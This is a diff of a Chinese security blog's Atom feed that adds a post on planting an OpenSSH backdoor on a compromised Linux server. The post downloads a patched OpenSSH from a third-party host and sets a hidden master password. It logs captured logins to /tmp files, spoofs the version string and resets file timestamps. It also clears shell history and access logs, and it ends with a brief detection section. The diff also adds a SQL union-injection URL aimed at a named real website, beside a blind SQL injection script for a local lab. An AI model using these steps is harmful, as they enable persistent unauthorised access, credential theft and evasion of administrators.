@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-08-03T08:34:38.632Z</updated>
+  <updated>2017-09-26T14:10:42.416Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,51 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux渗透之OpenSSH后门</title>
+    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/2017/09/26/Linux%E6%B8%97%E9%80%8F%E4%B9%8BOpenSSH%E5%90%8E%E9%97%A8.html"/>
+    <id>http://yoursite.com/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html</id>
+    <published>2017-09-26T12:59:04.000Z</published>
+    <updated>2017-09-26T14:10:42.416Z</updated>
+    
+    <content type="html"><![CDATA[<p>　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。<br>　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4</p>
+<h3 id="0x01-查看版本"><a href="#0x01-查看版本" class="headerlink" title="0x01 查看版本"></a>0x01 查看版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -V</div></pre></td></tr></table></figure>
+<p>Centos 7.0<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42766212.jpg" alt=""><br>Ubuntu 16.0.4<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/78241917.jpg" alt=""><br>有必要的话需要对原ssh配置文件进行备份，可以对后期的文件时间进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp -p /etc/ssh/ssh_config  / etc/ssh/ssh_config.bak</div><div class="line">cp -p /etc/ssh/sshd_config  / etc/ssh/sshd_config.bak</div></pre></td></tr></table></figure></p>
+<h3 id="0x02-下载SSH配置文件"><a href="#0x02-下载SSH配置文件" class="headerlink" title="0x02 下载SSH配置文件"></a>0x02 下载SSH配置文件</h3><p><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz" target="_blank" rel="external">openssh-5.9p1.tar.gz</a><br><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz" target="_blank" rel="external">openssh-5.9p1.patch.tar.gz</a><br>　　使用wget进行远程下载，如果没有安装wget，可以安装可以直接下载openssh源码，也可以使用菜刀大马等上传上去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Centos:yum -y install wget</div><div class="line">Ubuntu:apt-get install wget</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-编辑安装"><a href="#0x03-编辑安装" class="headerlink" title="0x03 编辑安装"></a>0x03 编辑安装</h3><p>Centos 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar zxvf openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.patch.tar.gz</div><div class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面</div><div class="line">patch &lt; sshbd5.9p1.diff</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/4576919.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/76087726.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/66109180.jpg" alt=""><br>可能遇到的问题patch未安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install patch</div></pre></td></tr></table></figure></p>
+<p>Ubuntu 16.0.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server   #安装SSH</div><div class="line">sudo service ssh start</div><div class="line"></div><div class="line">vim /etc/ssh/sshd_config #设置root连接ssh</div><div class="line"></div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin prohibit-password</div><div class="line">StrictModes yes</div><div class="line">改成</div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin yes</div><div class="line">StrictModes yes</div><div class="line"></div><div class="line">/etc/init.d/ssh restart   #重启</div></pre></td></tr></table></figure></p>
+<p>　　编辑安装Centos 7和Ubuntu 16.0.4过程一样，就不过多介绍了。</p>
+<h3 id="0x04-修改后门密码和文件记录"><a href="#0x04-修改后门密码和文件记录" class="headerlink" title="0x04 修改后门密码和文件记录"></a>0x04 修改后门密码和文件记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim includes.h</div><div class="line">int secret_ok;</div><div class="line">FILE *f;</div><div class="line">#define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码</div><div class="line">#define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码</div><div class="line">#define SECRETPW &quot;warden&quot; # 远程连接密码</div><div class="line">#endif /* INCLUDES_H */</div></pre></td></tr></table></figure>
+<p>　　可以对后门密码和记录文件进行修改，在文件前面加上.相当于是隐藏文件，也可以换个隐蔽的目录。修改之后的<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/1960037.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim version.h</div><div class="line">/* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */</div><div class="line">#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;</div><div class="line">#define SSH_PORTABLE &quot;p1&quot;</div><div class="line">#define SSH_RELEASE SSH_VERSION SSH_PORTABLE</div></pre></td></tr></table></figure></p>
+<p>　　可以根据我们刚才的查看的版本信息进行修改，使其版本一致不易被管理员发现和察觉。</p>
+<h3 id="0x05-编译安装"><a href="#0x05-编译安装" class="headerlink" title="0x05 编译安装"></a>0x05 编译安装</h3><p>Centos 7<br>首先对ssh里面的几个key的权限进行修改，否则可能进行编译的时候key不能修改而报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod 620 moduli</div><div class="line">chmod 600 sshd_config ssh_host_ecdsa_key ssh_host_rsa_key</div><div class="line">chmod 644 ssh_config ssh_host_ecdsa_key.pub ssh_host_rsa_key.pub</div></pre></td></tr></table></figure></p>
+<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl openssl-devel pam-devel zlib zlib-devel</div><div class="line">./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/45803683.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42590305.jpg" alt=""></p>
+<p>Ubuntu 16.04</p>
+<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get install -y openssl libssl-dev libpam0g-dev</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">/etc/init.d/ssh restart</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/58021783.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/59095904.jpg" alt=""></p>
+<h3 id="0x06-系统优化"><a href="#0x06-系统优化" class="headerlink" title="0x06 系统优化"></a>0x06 系统优化</h3><p>　　恢复新配置文件的日期跟旧文件日期一致对ssh_config和sshd_config新旧文件进行内容对比，使其配置文件一致，然后在修改文件日期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</div><div class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
+<p>清除操作日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">export HISTFILE=/dev/null</div><div class="line">export HISTSIZE=0</div><div class="line">cd /etc/httpd/logs/</div><div class="line">sed -i ‘/192.168.52.175/d’ access_log*</div><div class="line">echo &gt;/root/.bash_history //清空操作日志</div></pre></td></tr></table></figure></p>
+<h3 id="0x07-修复方案与应急响应"><a href="#0x07-修复方案与应急响应" class="headerlink" title="0x07 修复方案与应急响应"></a>0x07 修复方案与应急响应</h3><p>1）重装openssh软件<br>2）SSH禁止对外开放</p>
+<p>应急响应：<br>1）比对ssh的版本<br>ssh -V<br>2）查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>3）strings检查/usr/sbin/sshd，看是否有邮箱信息<br>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。<br>4）通过strace监控sshd进程读写文件的操作<br>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps axu | grep sshd | grep -v grep</div><div class="line">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</div><div class="line">strace -o aa -ff -p 65530</div><div class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</div><div class="line">aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>渗透测试--01信息搜集</title>
@@ -97,7 +142,7 @@
     <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/07/01/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html"/>
     <id>http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html</id>
     <published>2017-07-01T13:27:25.000Z</published>
-    <updated>2017-07-16T11:14:05.480Z</updated>
+    <updated>2017-08-24T02:31:51.384Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h3><p>1、连接符:mysql 空格，Oracle ||,sql server +<br>2、黑魔法${IFS}，Linux下可以使用其代替空格</p>
 <a id="more"></a>
@@ -237,6 +282,8 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding: utf-8 -*-</div><div class="line">import requests</div><div class="line">import time</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">                startTime=time.time()</div><div class="line">                payload = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">                url = payload.format(pos,mid)</div><div class="line">                response=requests.get(url)    #发送请求</div><div class="line">                if time.time() - startTime &lt; 5:    #判断是否延时了5秒</div><div class="line">                    low = mid + 1</div><div class="line">                else:</div><div class="line">                    high = mid</div><div class="line">                mid = (high + low) &gt;&gt; 1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
 <p>剩余步骤和基于布尔的差不多，只是加了一个if判断语句进行判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">获取表名：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23</div><div class="line">获取列名：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">获取内容：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div></pre></td></tr></table></figure></p>
+<p>1,column_name from information_schema.columns where table_schema = database() and table_name = 0x6d63795f61646d696e</p>
+<p><a href="http://www.innogreen.com.hk/VerticalGreening.php?id=-22" target="_blank" rel="external">http://www.innogreen.com.hk/VerticalGreening.php?id=-22</a> union select 1,group_concat(column_name) from information_schema.columns where  table_name = 0x6d63795f61646d696e #</p>
 ]]></content>
     
     <summary type="html">
@@ -808,9 +855,9 @@
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -1632,9 +1679,9 @@ print c
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -1671,40 +1718,6 @@ print c
       <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
       <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代理IP是否会被追查到</title>
-    <link href="http://yoursite.com/uncategorized/2017/02/19/%E4%BB%A3%E7%90%86IP%E6%98%AF%E5%90%A6%E4%BC%9A%E8%A2%AB%E8%BF%BD%E6%9F%A5%E5%88%B0.html"/>
-    <id>http://yoursite.com/uncategorized/2017/02/19/代理IP是否会被追查到.html</id>
-    <published>2017-02-19T01:17:46.000Z</published>
-    <updated>2017-02-19T01:23:17.665Z</updated>
-    
-    <content type="html"><![CDATA[<p>   在实际的渗透测试中，我们或许需要隐藏我们的真实IP来进行一些敏感的操作，使用一些代理IP用来逃避我们的真实身份，那么什么是代理IP，使用代理IP是否可以被追查到呢？<br><img src="http://i1.piimg.com/567571/3bd2d1150884b87e.jpg" alt=""><br><a id="more"></a></p>
-<h3 id="代理服务器的主要用途："><a href="#代理服务器的主要用途：" class="headerlink" title="代理服务器的主要用途："></a>代理服务器的主要用途：</h3><p>  <strong>1、共享网络</strong><br>最常见的可能是用代理服务器共享上网，很多人不知不觉中就在用，比如通过sygate，wingate，isa，ccproxy，NT系统自带的网络共享等，可以提供企业级的文件缓存、复制和地址过滤等服务，充分利用局域网出口的有限带宽，加快内网用户的 访问速度，可以解决仅仅有一条线路一个IP，IP资源不足，带局域网很多用户上网的功能，同时可以做为一个防火墙，隔离内网与外网，并且能提供监控网络和记录传输信息的功能，加强了局域网的安全性，又便于对上网用户进行管理。<br>  <strong>2、访问代理</strong><br>加快访问网站速度，在网络出现拥挤或故障时，可通过代理服务器访问目的网站。比如A要访问C网站，但A到C网络出现问题，可以通过绕道，假设B是代理服务器，A可通过B， 再由B到C。大家还记得前几个月，有段时间网络不正常，基本访问不了外国网站，如GOOGLE，YAHOO， 甚至连CCF都访问不了，心里很着急。结果通过一个代理服务器，发现都可以访问，速度还不错，在这样的情况下，代理服务器就可以发挥很大的作用了。还有一类代理服务器备份有相当数量的缓存文件，如果我们当前所访问的数据在代理服务器的缓存文件中，则可直接 读取，而无需再连接到远端Web服务器。这样，加快了访问速度。<br>  <strong>3、防止攻击</strong><br>隐藏自己的真实地址信息，还可隐藏自己的IP，防止被黑客攻击。通过分析指定IP地址，可以查询到网络用户的所在地。例如，大家在一些论坛上看到，论坛中明确标出了发帖用户所在地，这就是根据论坛会员登录时的IP地址解析的。还有平日里我们最为常 用的显IP版QQ，在“发送消息”窗口中，可以查看对方的IP及解析出的地理位置。而当我们使用相应协议的代理服务器后，就可以达到隐藏自己当前所在地地址的目的了。<br>  <strong>4、突破限制</strong><br>代理服务器还可以突破网络限制。比如局域网对上网用户的端口、目的网站、协议、游戏、即时通讯软件等的限制，都可以突破这些限制，可参见我这篇帖子，如何突破局域网对上网用户的一些限制 不再重复。举个例子：GOOGLE我们都喜欢用，其实GOOGLE有一个功能就有点类似于代理服务器的功能，就是网页快照，网站经常发生变动，地址或者网站关了，网站服务器发生故障了，或者已经更新了，但我们仍然要查以前非常有用的资料，网页快照就排 上用场了，Google以其复杂而全自动的搜索方法排除了任何人为因素对搜索结果的影响，保证了网页排名的客观公正，Google可以方便、诚实、客观地帮您在网上找到有价值的资料。GOOGLE有一个海量的数据库，如果找不到服务器，Google储存的网页快照也可救急。虽然网页快照中的信息可能不是最新的，但在网页快照中查找资料要比在实际网页中快得多，这时可以通过加密代理访问Google，再访问其网页快照来救急。<br>  <strong>5、掩藏身份</strong><br>代理服务器知识是黑客基本功，黑客的很多活动都是通过代理服务器，比如扫描、刺探，对局域网内机器进行渗透，黑客一般攻击的时候都是中转了很多级跳板，才攻击目标机器。隐藏了身份，保证了自己的安全。<br>  <strong>6、提高速度</strong><br>提高下载速度，突破下载限制。比如有的网站提供的下载资源，做了一IP一线程的限制，这时候可以用影音传送带，设置多线程，为每个线程设置一个代理。对于限制一个IP的情况很好突破，只要用不同的代理服务器，就可同时下载多个资源，适用于从WEB和FTP 上下载的情况。不过如果是论坛里面的资源，每个用户一个账号，并且限制一账号一IP，代理服务器就突破不了。还有一种情况，比如我们这里，电信的用户上不了联通的电影网站，联通的用户上不了的电信电影网站，这种情况只要电信的找一个联通地代理，IP地址属联通就行。联通找一个电信代理。就可以去电影网站下载其电影。教育网还可以通过代理服 务器可使无出国权限或无访问某IP段权限的计算机访问相关资源。<br>  <strong>7、充当防火墙</strong><br>因为所有使用代理服务器的用户都必须通过代理服务器访问远程站点，因此在代理服务器上就可以设置相应的限制，以过滤或屏蔽某些信息。<br>  <strong>8、用户管理</strong><br>通过代理服务器，管理员可以设置用户验证和记账功能，对用户进行登记，并对用户的访问时间、访问地点、信息浏览进行统计。没有登记的用户无权通过代理服务器访问Internet</p>
-<p>   举个简单的例子：比如说“A”使用了一个美国VPN代理，VPN的地址为142.54.168.75，入侵了某网站。如果想要追查他的真实IP地址，首先可以直接到VPN供应商那里，通过查看服务器日志等方式找出此人真实IP地址.</p>
-<p>   但如果VPN供应商和验证服务器都在美国，恐怕用这个方法不太现实。那么有人可能会说，还可以通过国内的ISP运营商查找路由器记录日志，直接找142.54.168.75相关记录。</p>
-<p>   那么就会出现以下问题：</p>
-<p>   1、如果通过国内ISP运营路由找记录，首先应该确定大体方位，比如确定为某省某市，然后再到这个省市找下级ISP路由器记录，总不能直接到ISP去查全国的数据库吧？那么请问单凭一个美国VPN地址，有何技术手段能确认大体的方位和省份？</p>
-<p>   2、如果确实是重要案件的话，一定要动用ISP全国性数据库，海量的数据库，可能有很多国内用友在当天同样登陆过这个VPN代理142.54.168.75，所以在路由器上会产生很多跟142.54.168.75不相关的记录，那么怎么能揪出A？ （貌似在路由器上能看到的有很多有局限性，比如“A”通过这个美国VPN入侵的某网站，在这个过程中，一些重要的数据和日志记录，都是通过美国VPN服务器中转的，日志都存储在美国VPN服务器上，路由器貌似也捕获不到什么重要信息。）</p>
-<p>   3、即使“A”用的不是美国VPN代理，是国内一些不正规供应商的国内代理，同样在无法到VPN供应商查服务器日志的情况下，并且这些代理和“A”不是一个省份的，通过ISP路由，有什么技术手段确定“A”真实的省份？</p>
-<p>   4、另外在多级代理情况下，如，A节点韩国-B节点美国-C节点广东“A”，很难确定使用代理者真实省份。又该怎么追踪。</p>
-<p><img src="http://i1.piimg.com/567571/b99ade94ddbd3929.jpg" alt=""></p>
-<p><strong>思路如下：</strong></p>
-<p>   方法一：中国出口网络核心层由北京、上海、广州、沈阳、南京、武汉、成都、西安等8个城市，主要控制权在北京上海广州，分别控制着青岛，上海，汕头的国际网络出口。现在很多高级设备都支持基于应用层采取策略（例如网页内容过滤），只需要在几个国际网络出口做上这些策略，而A使用的VPN代理又没有经过高级加密，是很容易筛选出上级IP的。<br>因为计算机不像人，不存在筛选困难。只要条件确定，查到记录也就是瞬间的事情。</p>
-<p>   方法二：考虑到一般黑客都会清除痕迹，在使用VPN代理的时候一般也会使用高级加密或者多层次代理。这样从网络上下手就可能比较困难了。只有从现实着手。可以打着ZF的名义要求，已知国内所有的VPN代理运营商的数据库查找该IP的代理情况，以及其他相关信息，逐层排查。如果查询不到，该VPN代理可能就是A自己架设的了。这种情况下查下IP所在的国外供应商，直接以ZF的名义要求查询，结果肯定能查到。就是不知道国外的这些供应商会不会一定配合你查。</p>
-<p>   综上，代理IP是绝对能被追踪名到的。想查的话，首先你得有敦实的技术，庞大的资源，丰厚的人脉，光凭技术实现的可能性相当小。当然一般已知的vpn代理，你可以直接找管理说明情况配合让其调查。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;   在实际的渗透测试中，我们或许需要隐藏我们的真实IP来进行一些敏感的操作，使用一些代理IP用来逃避我们的真实身份，那么什么是代理IP，使用代理IP是否可以被追查到呢？&lt;br&gt;&lt;img src=&quot;http://i1.piimg.com/567571/3bd2d1150884b87e.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
